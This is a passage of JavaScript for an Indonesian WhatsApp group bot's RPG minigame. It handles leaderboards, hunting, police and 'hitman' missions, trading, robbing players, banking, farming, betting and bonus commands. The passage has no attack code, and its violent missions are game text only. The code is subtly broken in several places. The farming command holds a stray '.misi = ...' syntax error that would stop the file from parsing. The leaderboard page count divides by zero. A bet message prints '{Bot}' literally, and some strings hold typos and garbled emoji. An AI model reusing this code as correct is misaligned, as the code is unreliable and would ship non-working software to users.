case 'leaderboard': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
const getRandom = (ext) => {
return `${Math.floor(Math.random() * 10000)}${ext}`
}
const { areJidsSameUser } = require ('@whiskeysockets/baileys')
function sort(property, ascending = true) {
if (property) return (...args) => args[ascending & 1][property] - args[!ascending & 1][property]
else return (...args) => args[ascending & 1] - args[!ascending & 1]
}

function toNumber(property, _default = 0) {
if (property) return (a, i, b) => {
return { ...b[i], [property]: a[property] === undefined ? _default : a[property] }
}
else return a => a === undefined ? _default : a
}

function enumGetKey(a) {
return a.jid
}


/**
 * Detect Number
 * @param {Number} x 
 */
function isNumber(number) {
if (!number) return number
number = parseInt(number)
return typeof number == 'number' && !isNaN(number)
}
const leaderboards = [
'level',
'exp',
'limit',
'money',
'iron',
'gold',
'diamond',
'emerald',
'trash',
'joinlimit',
'potion',
'petFood',
'wood',
'rock',
'string',
'common',
'uncommon',
'mythic',
'legendary',
'pet',
'bank',
'chip',
'skata'
]
let users = Object.entries(db.data.users).map(([key, value]) => {
return {
...value, jid: key
}
})
let imgr = getRandom()
let leaderboard = leaderboards.filter(v => v && users.filter(user => user && user[v]).length)
let type = (args[0] || '').toLowerCase()
const getPage = (item) => Math.ceil((users.filter(user => user && user[item]).length) / 0)
let wrong = `🔖 ᴛʏᴩᴇ ʟɪsᴛ :
${leaderboard.map(v => `
⮕ ${rpg.emoticon(v)} - ${v}
`.trim()).join('\n')}
––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
⮕ ᴛᴏ ᴠɪᴇᴡ ᴅɪғғᴇʀᴇɴᴛ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ:
${command} [type]
★ ᴇxᴀᴍᴩʟᴇ:
${command} legendary`.trim()
if (!leaderboard.includes(type))
return await ReplyRynzz('*––––『 𝙻𝙴𝙰𝙳𝙴𝚁𝙱𝙾𝙰𝚁𝙳 』––––*\n' + wrong, {
contextInfo: {

}
})
let page = isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 0), getPage(type)): 0
let sortedItem = users.map(toNumber(type)).sort(sort(type))
let userItem = sortedItem.map(enumGetKey)
// let len = args[0] && args[0].length > 0 ? Math.min(100, Math.max(parseInt(args[0]), 5)) : Math.min(5, sortedExp.length)
let text = `
🏆 ʀᴀɴᴋ: ${userItem.indexOf(m.sender) + 1} ᴏᴜᴛ ᴏғ ${userItem.length}

*• ${rpg.emoticon(type)} ${type} •*

${sortedItem.slice(page * 0, page * 5 + 5).map((user, i) => `${i + 1}.*﹙${user[type]}﹚*- ${participants.some(p => areJidsSameUser(user.jid, p.id)) ? `${user.registered ? user.name: Alice.getName(user.jid)} \nwa.me/`: 'ғʀᴏᴍ ᴏᴛʜᴇʀ ɢʀᴏᴜᴩ\n @'}${user.jid.split`@`[0]}`).join`\n\n`}
`.trim()
return await ReplyRynzz(text,{
contextInfo: {
mentionedJid: [...userItem.slice(page * 0, page * 5 + 5)].filter(v => !participants.some(p => areJidsSameUser(v, p.id))),
 
}
})
}
break                          

case 'mulung': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}
let user = db.data.users[m.sender]
let time = user.lastmulung + 1800000

if (new Date - user.lastmulung < 1800000) return ReplyRynzz(`Anda sudah lelah untuk mulung\nTunggu selama ${msToTime(time - new Date())} lagi`)

let botol = Math.floor(Math.random() * 1000)
let kaleng = Math.floor(Math.random() * 1000)
let kardus = Math.floor(Math.random() * 1000)
let gelas = Math.floor(Math.random() * 1000)
let plastik = Math.floor(Math.random() * 1000)

user.botol += botol * 1
user.kaleng += kaleng * 1
user.kardus += kardus * 1
user.gelas += gelas * 1
user.plastik += plastik * 1
user.lastmulung = new Date * 1

ReplyRynzz(`Selamat kamu mendapatkan : \n+${botol} Botol\n+${kaleng} Kaleng\n+${kardus} Kardus\n+${gelas} Gelas\n+${plastik} Plastik`)
}
break

case 'berburu': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
console.log({ms,h,m,s})
return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastmisi)
let _timers = (3600000 - __timers)
let timers = clockString(_timers) 
let name = Alice.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Berburu'
Alice.misi = Alice.misi ? Alice.misi : {}
if (id in Alice.misi) {
return ReplyRynzz( `Selesaikan Misi ${Alice.misi[id][0]} Terlebih Dahulu`)
 }
if (new Date - user.lastmisi > 3600000) {
let hewan1 = Math.floor(Math.random() * 10)
let hewan2 = Math.floor(Math.random() * 10)
let hewan3 = Math.floor(Math.random() * 10)
let hewan4 = Math.floor(Math.random() * 10)
let hewan5 = Math.floor(Math.random() * 10)
let hewan6 = Math.floor(Math.random() * 10)
let hewan7 = Math.floor(Math.random() * 10)
let hewan8 = Math.floor(Math.random() * 10)
let hewan9 = Math.floor(Math.random() * 10)
let hewan10 = Math.floor(Math.random() * 10)
let hewan11 = Math.floor(Math.random() * 10)
let hewan12 = Math.floor(Math.random() * 10)

let hsl = `🕸 *Hasil Berburu ${user.registered ? user.name : Alice.getName(m.sender)}* 
${hewan1 ? `
🐂 Banteng: ${hewan1}` : ''} ${hewan2 ? `
🐅 Harimau: ${hewan2}` : ''} ${hewan3 ? `
🐘 Gajah: ${hewan3}` : ''} ${hewan4 ? `
🐐 Kambing: ${hewan4}` : ''} ${hewan5 ? `
🐼 Panda: ${hewan5}` : ''} ${hewan6 ? `
🐊 Buaya: ${hewan6}` : ''} ${hewan7 ? `
🐃 Kerbau: ${hewan7}` : ''} ${hewan8 ? `
🐮 Sapi: ${hewan8}` : ''} ${hewan9 ? `
🐒 Monyet: ${hewan9}` : ''} ${hewan10 ? `
🐗 Babi Hutan: ${hewan10}` : ''} ${hewan11 ? `
🐖 Babi: ${hewan11}` : ''} ${hewan12 ? `
🐓 Ayam: ${hewan12}` : ''}
`.trim()

user.banteng += hewan1
user.harimau += hewan2
user.gajah += hewan3
user.kambing += hewan4
user.panda += hewan5
user.buaya += hewan6
user.kerbau += hewan7
user.sapi += hewan8
user.monyet += hewan9
user.babihutan += hewan10
user.babi += hewan11
user.ayam += hewan12

Alice.misi[id] = [
kerja,
setTimeout(() => {
delete Alice.misi[id]
}, 20000)
]

setTimeout(() => {
ReplyRynzz(`${hsl}`)
}, 20000)

setTimeout(() => {
ReplyRynzz(`Nah ini dia`)
}, 18000)

setTimeout(() => {
ReplyRynzz('Dorr🔥')
}, 15000)

setTimeout(() => {
ReplyRynzz('Dapat Sasaran')
}, 14000)

setTimeout(() => {
ReplyRynzz('Sedang mencari mangsa...')
}, 0)
user.lastmisi = new Date * 1
} else ReplyRynzz(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break

case 'polisi': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
console.log({ms,h,m,s})
return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastmisi)
let _timers = (3600000 - __timers)
let order = db.data.users[m.sender].ojekk
let timers = clockString(_timers)
let name = Alice.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Polisi'
Alice.misi = Alice.misi ? Alice.misi: {}
if (id in Alice.misi) {
ReplyRynzz(`Selesaikan Misi ${Alice.misi[id][0]} Terlebih Dahulu`)
throw false
}
if (new Date - db.data.users[m.sender].lastmisi > 3600000) {
let randomaku1 = Math.floor(Math.random() * 10)
let randomaku2 = Math.floor(Math.random() * 10)

let rbrb1 = (randomaku1 * 100000)
let rbrb2 = (randomaku2 * 1000)

var dimas = `
👮Mengejar Pencuri....
`.trim()

var dimas2 = `
👮Menangkap pencuri....
`.trim()

var dimas3 = `
🚔Membawa ke kantor polisi\nDan di penjara
`.trim()

var dimas4 = `
➕ 💹Menerima gaji....
`.trim()

var hsl = `
*—[ Hasil Polisi ${name} ]—*
➕ 💹 Uang = [ ${rbrb1} ]
➕ ✨ Exp = [ ${rbrb2} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim()

user.money += rbrb1
user.exp += rbrb2
user.ojekk += 1

Alice.misi[id] = [
kerja,
setTimeout(() => {
delete Alice.misi[id]
}, 27000)
]

setTimeout(() => {
ReplyRynzz(`${hsl}`)
}, 27000)

setTimeout(() => {
ReplyRynzz(`${dimas4}`)
}, 25000)

setTimeout(() => {
ReplyRynzz(`${dimas3}`)
}, 20000)

setTimeout(() => {
 ReplyRynzz(`${dimas2}`)
}, 15000)

setTimeout(() => {
ReplyRynzz(`${dimas}`)
}, 10000)

setTimeout(() => {
ReplyRynzz('??Sedang Berpatroli.....')
}, 0)
user.lastmisi = new Date * 1
} else ReplyRynzz(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break

// let pajak = 0.02
case 'berdagang': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
console.log({ms,h,m,s})
return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}

let dapat = (Math.floor(Math.random() * 5000))
let who
if (m.isGroup) who = m.mentionedJid[0]
else who = m.chat
if (!who) return reply ('Tag salah satu lah, yang kamu ingin berdagang bareng')
if (typeof db.data.users[who] == 'undefined') return ReplyRynzz('Pengguna tidak ada didalam data base')
let __timers = (new Date - db.data.users[m.sender].lastdagang)
let _timers = (28800000 - __timers)
let timers = clockString(_timers)
let users = db.data.users
let username = Alice.getName(who)
if (new Date - db.data.users[m.sender].lastdagang > 28800000) {
if (4999 > users[who].money) return reply ('Target tidak memiliki modal harap masukkan modal 5000')
if (4999 > users[m.sender].money) return reply ('kamu tidak memiliki modal harap masukkan modal 5000')
users[who].money -= dapat * 1
users[m.sender].money -= dapat * 1
db.data.users[m.sender].lastdagang = new Date * 1
ReplyRynzz(`Mohon tunggu kak..\nKamu dan @${who.replace(/@.+/, '')} sedang berdagang.. ðŸ˜…\n\nKamu dan @${who.replace(/@.+/, '')} meletakkan modal -${dapat} ðŸ˜…`)
setTimeout(() => {
ReplyRynzz(m.chat, `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, m, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 3600000)
setTimeout(() => {
ReplyRynzz(`Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 7200000)
setTimeout(() => {
ReplyRynzz( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 10800000)
setTimeout(() => {
ReplyRynzz( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 14400000)
setTimeout(() => {
ReplyRynzz( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 18000000)
setTimeout(() => {
ReplyRynzz( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 21600000)
setTimeout(() => {
ReplyRynzz( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 25200000)
setTimeout(() => {
ReplyRynzz( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +10000\n${users[m.sender].money += 10000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +100000\n${users[who].money += 100000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 28800000)
} else ReplyRynzz(`Anda Sudah Berdagang , tunggu ${timers} lagi..`)

}
break

case 'merampok':
case 'rampok': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()

function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
let dapat = (Math.floor(Math.random() * 100000))
let users = db.data.users
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : (m.quoted && m.quoted.sender);
if (!who) return ReplyRynzz('Tag orang yang mau kamu Rampok!');
if (users[who].level > users[m.sender].level) return ReplyRynzz(`Level kamu harus lebih tinggi dari @${who.split('@')[0]} Untuk bisa merampoknya!`, false, { mentions: [who] })
let __timers = (new Date - db.data.users[m.sender].lastrampok)
let _timers = (3600000 - __timers)
let timers = clockString(_timers)
if (new Date - db.data.users[m.sender].lastrampok > 3600000) {
if (10000 > users[who].money) return ReplyRynzz('ᴛᴀʀɢᴇᴛ ɢᴀᴀᴅᴀ 💰ᴜᴀɴɢ ʙᴏᴅᴏʜ, ᴋɪꜱᴍɪɴ ᴅɪᴀ')
users[who].money -= dapat * 1
users[m.sender].money += dapat * 1
db.data.users[m.sender].lastrampok = new Date * 1
ReplyRynzz( `ʙᴇʀʜᴀꜱɪʟ ᴍᴇʀᴀᴍᴘᴏᴋ ᴍᴏɴᴇʏ ᴛᴀʀɢᴇᴛ ꜱᴇʙᴇꜱᴀʀ 💰${dapat}`)
} else ReplyRynzz( `Anda Sudah merampok dan berhasil sembunyi , tunggu ${timers} untuk merampok lagi`)
}
break

case 'banknabung': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
if (!q) return ReplyRynzz(`_*Anda Tidak Menginput Jumlah Uang Yang Ingin Ditabung*_

- _*${Xyroo}${command} jumlah*_
- _*${Xyroo}${command} all*_

\`${Xyroo}${command} 10000\``)
const xpperlimit = 1
let user = db.data.users[m.sender]
count = q.toLowerCase() === 'all' ? user.money : parseInt(q)
count = Math.min(user.money, count)
if (count <= 0) return ReplyRynzz('Kamu tidak memiliki cukup uang untuk menabung.')
if (user.atm == 0) return ReplyRynzz('kamu belum mempunyai kartu ATM')
if (user.bank > user.fullatm) return ReplyRynzz('Uang Di ATM sudah penuh!')
if (count > user.fullatm - user.bank) return ReplyRynzz('Uangnya nya sudah mencapai batas')
if (user.money >= xpperlimit * count) {
user.money -= xpperlimit * count
user.bank += count
ReplyRynzz(`Sukses menabung sebesar ${count} Money 💹`)
} else {
return
}
}
break

case 'banktarik': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
if (!q) return ReplyRynzz(`_*Anda Tidak Menginput Jumlah Uang Yang Ingin Ditarik*_

- _*${Xyroo}${command} jumlah*_
- _*${Xyroo}${command} all*_

\`${Xyroo}${command} 10000\``);
const xpperlimit = 1
let user = db.data.users[m.sender]
count = q.toLowerCase() === 'all' ? user.bank : parseInt(q)
count = Math.min(user.bank, count)
if (count <= 0) return ReplyRynzz('Kamu tidak memiliki cukup uang untuk menabung.')
if (user.atm == 0) return ReplyRynzz('kamu belum mempuyai kartu ATM !')
if (user.bank >= xpperlimit * count) {
user.bank -= xpperlimit * count
user.money += count
ReplyRynzz(`Sukses menarik sebesar ${count} Money 💹`)
} else {
return
}
}
break

case 'berkebon':{
if (!m.isGroup) return Xgroup()
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
const timeout = 1800000
let __timers = (new Date - db.data.users[m.sender].lastberkebon)
let _timers = (timeout - __timers)
let timers = clockString(_timers)
let user = db.data.users[m.sender]
let { stock } = db.data.settings[botNumber]
let pisang = 100 - user.bibitpisang
let anggur = 100 - user.bibitanggur
let mangga = 100 - user.bibitmangga
let jeruk = 100 - user.bibitjeruk
let apel = 100 - user.bibitapel
let kerja = 'Berkebun'
let id = m.chat
.misi = Alice.misi ? Alice.misi : {}
if (id in Alice.misi) {
ReplyRynzz(`Selesaikan Misi ${Alice.misi[id][0]} Terlebih Dahulu`)
return false
}
let caption = `
📮 Kamu Membutuhkan Bibit:\n${user.bibitpisang < 100 ? `\n${global.rpg.emoticon('bibitpisang')} BibitPisang: ${pisang}`: ''} ${user.bibitanggur < 100 ? `\n${global.rpg.emoticon('bibitanggur')} BibitAnggur: ${anggur}`: ''} ${user.bibitmangga < 100 ? `\n${global.rpg.emoticon('bibitmangga')} BibitMangga: ${mangga}`: ''} ${user.bibitjeruk < 100 ? `\n${global.rpg.emoticon('bibitjeruk')} BibitJeruk: ${jeruk}`: ''} ${user.bibitapel < 100 ? `\n${global.rpg.emoticon('bibitapel')} BibitApel: ${apel}`: ''}`.trim()
if (new Date - user.lastberkebon > 1800000) {
if (user.bibitpisang >= 100 && user.bibitanggur >= 100 && user.bibitmangga >= 100 && user.bibitapel >= 100 && user.bibitjeruk >= 100) {
let hasil1 = Math.floor(Math.random() * 100)
let hasil2 = Math.floor(Math.random() * 100)
let hasil3 = Math.floor(Math.random() * 100)
let hasil4 = Math.floor(Math.random() * 100)
let hasil5 = Math.floor(Math.random() * 100)

let caption = `⌛ Hasil Panen Kamu

${global.rpg.emoticon('pisang')} Pisang: ${hasil1}
${global.rpg.emoticon('anggur')} Anggur ${hasil2}
${global.rpg.emoticon('mangga')} Mangga: ${hasil3}
${global.rpg.emoticon('jeruk')} Jeruk: ${hasil4}
${global.rpg.emoticon('apel')} Apel: ${hasil5}
`
user.pisang += hasil1
user.anggur += hasil2
user.mangga += hasil3
user.jeruk += hasil4
user.apel += hasil5

user.bibitpisang -= 100
user.bibitanggur -= 100
user.bibitmangga -= 100
user.bibitjeruk -= 100
user.bibitapel -= 100

stock.bibitpisang += 100
stock.bibitanggur += 100
stock.bibitmangga += 100
stock.bibitjeruk += 100
stock.bibitapel += 100


Alice.misi[id] = [
kerja,
setTimeout(() => {
delete Alice.misi[id]
}, 20000)
]

setTimeout(() => {
ReplyRynzz(`${caption.trim()}`)
}, 20000)

setTimeout(() => {
ReplyRynzz('Sedang Menanam Bibit...')
}, 0)
user.lastberkebon = new Date * 1
} else ReplyRynzz(`${caption}`)
} else ReplyRynzz(`Mohon Menunggu Selama ${timers} Untuk Berkebun Kembali...`)
}
break

case 'bet': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function number(x = 0) {
x = parseInt(x)
return !isNaN(x) && typeof x == 'number'
}
const items = [ 'money', 'chip' ]
let user = db.data.users[m.sender]
let item = items.filter(v => v in user && typeof user[v] == 'number')
let type = (args[0] || '').toLowerCase()
let count = (args[1] && number(parseInt(args[1])) ? Math.max(parseInt(args[1]), 1): /all/i.test(args[1]) ? Math.floor(parseInt(user[type])): 1) * 1
if (!item.includes(type)) return ReplyRynzz(`*List Item:*\n${item.map(v => `${global.rpg.emoticon(v)}${v}`.trim()).join('\n')}\n\nExample:\nbet money 100000`)
if ((user[type] * 1) < count) return ReplyRynzz(`*${type} ${global.rpg.emoticon(type)}* kamu tidak cukup!!`)
let moneyDulu = user[type] * 1
let txt = (m.msg && m.msg.selectedDisplayText ? m.msg.selectedDisplayText: m.text ? m.text: '').toLowerCase()
try {
let Bot = (Math.ceil(Math.random() * 91)) * 1
let Kamu = (Math.floor(Math.random() * 71)) * 1
let status = 'Kalah'
if (Bot < Kamu) {
user[type] += count * 1
status = 'Menang'
} else if (Bot > Kamu) {
user[type] -= count * 1
} else {
status = 'Seri'
user[type] += (Math.floor(count / 1.5)) * 1
}
ReplyRynzz(`
| *PLAYERS* | *POINT* |
*🤖 BOT:* {Bot}
*👤 KAMU:* ${Kamu}

Kamu *${status}*, kamu ${status == 'Menang' ? `Mendapatkan *+${count * 2}*`: status == 'Kalah' ? `Kehilangan *-${count * 1}*`: `Mendapatkan *+${Math.floor(count / 1.5)}*`} *${type} ${global.rpg.emoticon(type)}*
`.trim())
} catch (e) {
if (moneyDulu > (user[type] * 1)) user[type] = moneyDulu * 1
ReplyRynzz('Error saat melakukan judi (Rejected)')
}
}
break

case 'claim':
case 'bonus': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds

return hours + " jam " + minutes + " menit " + seconds + " detik"
}
let user = db.data.users[m.sender]
let time = user.lastbonus + 86400000
if (new Date - user.lastbonus < 86400000) return ReplyRynzz(`Kamu Sudah Ambil Bonus Hari Ini\nTunggu selama ${msToTime(time - new Date())} lagi`)
let money = Math.floor(Math.random() * 50000000)
user.money += money * 1
user.lastbonus = new Date * 1
ReplyRynzz(`Selamat Kamu Mendapatkan Bonus : \n+${money} Money`)
}
break

case 'buah': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
let user = db.data.users[m.sender]
let ini_txt = `[ *GUDANG BUAH KAMU* ]\n\n`
ini_txt += `🍌 ${user.pisang} Pisang\n`
ini_txt += `🍇 ${user.anggur} Anggur\n`
ini_txt += `🥭 ${user.mangga} Mangga\n`
ini_txt += `🍊 ${user.jeruk} Jeruk\n`
ini_txt += `🍎 ${user.apel} Apel\n\n`
ini_txt += `Gunakan command *buah sell* untuk menjual.`
ReplyRynzz(`${ini_txt}`)
}
break

case 'bunuh':
case 'hitman': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastmisi)
let _timers = (3600000 - __timers)
let order = db.data.users[m.sender].ojekk
let timers = clockString(_timers)
let name = Alice.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Bunuh'
Alice.misi = Alice.misi ? Alice.misi : {}
if (id in Alice.misi) {
ReplyRynzz(`Selesaikan Misi ${Alice.misi[id][0]} Terlebih Dahulu`)
throw false
}
if (new Date - db.data.users[m.sender].lastmisi > 3600000) {
let randomaku4 = Math.floor(Math.random() * 10)
let randomaku5 = Math.floor(Math.random() * 10)

let rbrb4 = (randomaku4 * 100000)
let rbrb5 = (randomaku5 * 1000)

var dimas = `
🕵️ Mendapatkan Target.....
`.trim()

var dimas2 = `
⚔️ Menusuk Tubuhnya.....
`.trim()

var dimas3 = `
☠️ Target meninggal\nDan kamu mengambil barang² nya
`.trim()

var dimas4 = `
💼 Hasil dari membunuh....
`.trim()

var hsl = `
*—[ Hasil ${name} ]—*
➕ 💹 Uang = [ ${rbrb4} ]
➕ ✨ Exp = [ ${rbrb5} ]
➕ 👮 Pelanggaran +1
➕ ☑️ Misi Berhasil = +1
➕ 📥Total Misi Sebelumnya : ${order}
`.trim()

user.money += rbrb4
user.exp += rbrb5
user.ojekk += 1
user.warn += 1

Alice.misi[id] = [
kerja,
setTimeout(() => {
delete Alice.misi[id]
}, 27000)
]
setTimeout(() => {
ReplyRynzz(`${hsl}`)
}, 27000)

setTimeout(() => {
ReplyRynzz(`${dimas4}`)
}, 25000)

setTimeout(() => {
ReplyRynzz(`${dimas3}`)
}, 20000)

setTimeout(() => {
ReplyRynzz(`${dimas2}`)
}, 15000)

setTimeout(() => {
ReplyRynzz(`${dimas}`)
}, 10000)

setTimeout(() => {
ReplyRynzz('🔍Mencari Target pembunuhan.....')
}, 0)
user.lastmisi = new Date * 1
} else ReplyRynzz(`Silahkan , 0nggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break

case 'collect': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!m.isGroup) return Xgroup()
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
console.log({ms,h,m,s})
return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastclaim)
let _timers = (43200000 - __timers)
let timers = clockString(_timers) 
let user = db.data.users[m.sender]
if (new Date - db.data.users[m.sender].lastclaim > 43200000) {
ReplyRynzz(`Kamu sudah mengclaim dan mendapatkan *1000* 💵money dan *1* 🥤potion`)
user.money += 1000
user.potion += 1
user.lastclaim = new Date * 1
} else ReplyRynzz(`silahkan tunggu *${timers}* lagi untuk bisa mengclaim lagi`)
}
break

case 'craft':
case 'crafting': {
if (isBan) return Xban()
await xreaction()
if (!isUserRegistered(ckusrjoin)) return ReplyRynzz('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
